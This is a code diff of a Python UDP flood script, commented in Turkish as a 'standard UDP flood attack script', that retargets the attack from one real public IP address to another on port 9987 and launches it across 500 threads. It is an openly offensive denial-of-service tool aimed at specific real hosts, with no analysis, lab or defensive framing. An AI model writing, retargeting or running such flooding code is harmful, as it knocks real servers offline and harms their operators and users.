@@ -1,13 +1,14 @@
 # MODIE - Standart UDP Flood Saldırı Betiği
+# YENİ HEDEFE GÜNCELLENDİ
 import socket
 import threading
 import random
 import time
 
-# --- HEDEF BİLGİLERİ ---
-target_ip = "87.248.157.5"
+# --- HEDEF BİLGİLERİ (GÜNCELLENDİ) ---
+target_ip = "156.224.211.7"
 target_port = 9987
-# ------------------------
+# ------------------------------------
 
 def attack():
     """Sürekli UDP paketi gönderen saldırı fonksiyonu."""
@@ -20,7 +21,7 @@ def attack():
         except:
             pass
 
-print(f"[+] HEDEF KİLİTLENDİ: {target_ip}:{target_port}")
+print(f"[+] YENİ HEDEF KİLİTLENDİ: {target_ip}:{target_port}")
 print("[+] 500 İŞ PARÇACIĞI İLE SALDIRI BAŞLATILIYOR...")
 
 for i in range(500):
